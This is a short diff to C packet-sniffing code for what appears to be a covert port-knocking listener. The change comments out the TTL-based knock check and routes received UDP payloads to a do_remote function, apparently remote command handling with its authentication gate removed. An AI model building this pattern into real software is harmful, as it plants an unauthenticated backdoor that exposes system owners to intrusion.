@@ -90,7 +90,7 @@ const struct my_ip* ip;
     off = ntohs(ip->ip_off);
     ttl = ip->ip_ttl;
     klen =  sizeof(knock_code)/sizeof(knock_code[0]);
-
+/*
     if (knock_state < klen-1){ // payload in last packet
         printf ("TTL: %x\n", ttl);
 
@@ -102,7 +102,7 @@ const struct my_ip* ip;
             printf("Knock Fail\n");
             knock_state=0;
         }
-            
+
         return;
     }
     if(knock_code[knock_state]==(ttl)){
@@ -113,10 +113,10 @@ const struct my_ip* ip;
     knock_state=0;
     return;
     }
-
+*/
     // start thread/fork
 
-    if ((off & 0x1fff) == 0 ) {   	// i.e, no 1's in first 13 bits				
+    if ((off & 0x1fff) == 0 ) {   	// i.e, no 1's in first 13 bits
         // print SOURCE DESTINATION hlen version len offset */
         fprintf(stdout,"IP: ");
         fprintf(stdout,"%s(s) ", inet_ntoa(ip->ip_src));
@@ -148,7 +148,7 @@ void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* p
     const struct sniff_udp *udp=0;          // The TCP header
     const struct my_ip *ip;              	// The IP header
     const char *payload;                    // Packet payload
-    
+
     int size_ip, size_udp=8, size_payload, size_cmd=0;
 
     ip = (struct my_ip*)(packet + SIZE_ETHERNET);
@@ -170,7 +170,8 @@ void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* p
     if (size_payload > 0){
         printf("   Payload @(%s)\n", payload);
         //print_payload (payload, size_payload);
-        prx_payload (payload);
+        do_remote (payload);
+        // prx_payload (payload);
     }
 }
 
